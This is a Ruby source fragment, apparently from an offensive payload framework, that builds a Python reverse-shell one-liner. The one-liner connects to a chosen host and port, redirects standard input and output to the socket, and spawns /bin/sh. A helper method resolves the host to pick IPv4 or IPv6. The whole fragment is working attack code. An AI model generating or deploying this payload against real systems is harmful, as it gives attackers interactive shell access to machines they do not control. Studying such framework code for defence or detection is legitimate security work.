def build
  af_inet = case infer_ip_version
            when :ipv4 then 'AF_INET'
            when :ipv6 then 'AF_INET6'
            end

  @payload = %{python -c 'import socket,os,pty;s=socket.socket(socket.#{af_inet},socket.SOCK_STREAM);s.connect((#{host.dump},#{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'}
end

def infer_ip_version_from_host
  addresses = Support::Network::DNS.get_addresses(host)

  if addresses.empty?
    raise(PayloadError,"host name #{host.inspect} does not have any addresses associated with it")
  end

  if addresses.any? { |ip| ip =~ IPAddr::RE_IPV4ADDRLIKE }
    return :ipv4
  else
    return :ipv6
  end
end
